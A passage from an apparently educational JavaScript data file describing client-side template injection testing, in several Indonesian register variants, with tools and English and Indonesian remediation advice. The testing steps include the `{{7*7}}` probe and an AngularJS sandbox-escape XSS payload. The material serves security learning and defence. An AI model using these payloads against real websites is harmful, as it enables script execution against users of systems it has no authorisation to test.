          'Untuk AngularJS, coba lolosan sandbox: `{{constructor.constructor("alert(1)")()}}` — banyak versi lama mengizinkan eksekusi JS penuh.',
          'Uji konteks templat sisi klien: kotak pencarian yang merender hasil, sapaan personal, dan keadaan aplikasi satu halaman yang dirender dari parameter URL.',
          'Konfirmasi dampak XSS dengan menggabungkan ekspresi yang berfungsi dengan akses DOM, dan catat versi kerangka kerja untuk pencocokan CVE.'
        ],
        s: [
          'Tempel `{{7*7}}` di semua input — kalau muncul `49` (bukan tulisan `{{7*7}}`), template engine-nya nerima input mentah.',
          'Kenali yang dipakai: `{{7*7}}` itu Angular/Vue, `${7*7}` itu template literal biasa.',
          'Kalau Angular versi lama, coba bypass sandbox: `{{constructor.constructor("alert(1)")()}}` — beberapa versi bisa ngejalanin JavaScript bebas.',
          'Cek tempat yang hasilnya langsung muncul: pencarian, sapaan nama user, atau halaman yang datanya dari parameter URL.',
          'Kalau ekspresi jalan, naikin ke akses DOM buat bukti XSS, catat juga versi frameworknya buat cari CVE.'
        ]
      },
      tools: ['browser dev tools', 'Burp Suite', 'tplmap (server-side reference)'],
      remediation: {
        en: 'Never render raw user input through a template engine — insert values as data after compilation, not as template text. Upgrade AngularJS away from sandbox-vulnerable versions, and apply strict CSP.',
        t: 'Jangan pernah merender input user mentah melalui template engine — sisipkan nilai sebagai data setelah kompilasi, bukan sebagai teks template. Upgrade AngularJS dari versi yang rentan sandbox escape, dan terapkan CSP ketat.',
        b: 'Jangan pernah merender masukan pengguna mentah melalui mesin templat — sisipkan nilai sebagai data sesudah kompilasi, bukan sebagai teks templat. Tingkatkan AngularJS dari versi yang rentan lolosan sandbox, dan terapkan CSP yang ketat.',
        s: 'Input user dimasukin sebagai DATA setelah template jadi — bukan ditempel mentah ke dalamnya. Kalau masih pakai Angular lama, upgrade. CSP ketat nambah tameng.'
      }
    }
  ]
});
